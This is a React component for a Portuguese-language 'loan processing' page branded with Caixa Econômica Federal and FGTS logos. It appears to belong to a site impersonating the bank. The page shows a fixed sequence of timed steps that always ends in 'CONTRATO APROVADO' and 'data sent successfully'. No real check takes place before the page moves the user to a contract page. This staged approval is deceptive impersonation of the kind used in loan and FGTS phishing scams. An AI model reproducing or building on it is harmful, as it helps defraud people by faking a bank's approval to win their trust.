
import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Loader, Check } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { useIsMobile } from '@/hooks/use-mobile';

const LoanProcessing = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [currentStep, setCurrentStep] = useState(0);
  
  // Get the selected bank data from location state
  const { bankLogo, bankName } = location.state || {
    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
    bankName: "Caixa Econômica Federal"
  };

  // Processing steps
  const steps = [
    "Conferindo Documentação",
    "Conferindo Contrato",
    "CONTRATO APROVADO",
    "Enviando dados a seguradora",
    "Dados enviados com sucesso!"
  ];

  useEffect(() => {
    // Setup sequential processing steps
    let stepTimer: NodeJS.Timeout;
    
    if (currentStep < steps.length) {
      stepTimer = setTimeout(() => {
        setCurrentStep(currentStep + 1);
      }, 1300); // Show each step for 1.3 seconds
    } else {
      // Navigate to the contract page after completing all steps
      setTimeout(() => {
        navigate('/loan-contract', { 
          state: { bankLogo, bankName, ...location.state } 
        });
      }, 500);
    }

    return () => {
      clearTimeout(stepTimer);
    };
  }, [currentStep, steps.length, navigate, bankLogo, bankName, location.state]);

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Empréstimo em Processamento</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Estamos enviando sua proposta para o banco
        </div>
      </div>

      {/* Main content */}
      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-4 sm:p-6 flex flex-col items-center justify-center h-full">
          <div className="flex flex-col items-center justify-center space-y-8 max-w-md mx-auto">
            <div className="text-center mb-6">
              <h2 className="text-2xl font-semibold text-[#005CA9] mb-3">Enviando Proposta para o Banco</h2>
              <p className="text-gray-500">Por favor, aguarde enquanto processamos sua solicitação</p>
            </div>
            
            <div className="w-28 h-28 flex items-center justify-center mb-8">
              <img 
                src={bankLogo}
                alt={bankName}
                className="w-full h-full object-contain"
              />
            </div>
            
            {/* Status tracking steps */}
            <div className="w-full space-y-4">
              {steps.map((step, index) => (
                <div key={index} className="flex items-center gap-3">
                  {index < currentStep ? (
                    <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center">
                      <Check className="w-5 h-5 text-white" />
                    </div>
                  ) : index === currentStep ? (
                    <div className="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center">
                      <Loader className="w-5 h-5 text-white animate-spin" />
                    </div>
                  ) : (
                    <div className="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center">
                      <span className="text-gray-500">{index + 1}</span>
                    </div>
                  )}
                  <div className={`flex-1 ${index === currentStep ? 'font-semibold text-blue-700' : index < currentStep ? 'text-green-700' : 'text-gray-400'}`}>
                    {step}
                  </div>
                </div>
              ))}
            </div>
            
            {/* Animated loader at the bottom */}
            <div className="animate-pulse flex items-center justify-center mt-8">
              <Loader className="w-8 h-8 text-[#005CA9] animate-spin mr-2" />
              <span className="text-[#005CA9]">Aguarde um momento...</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanProcessing;
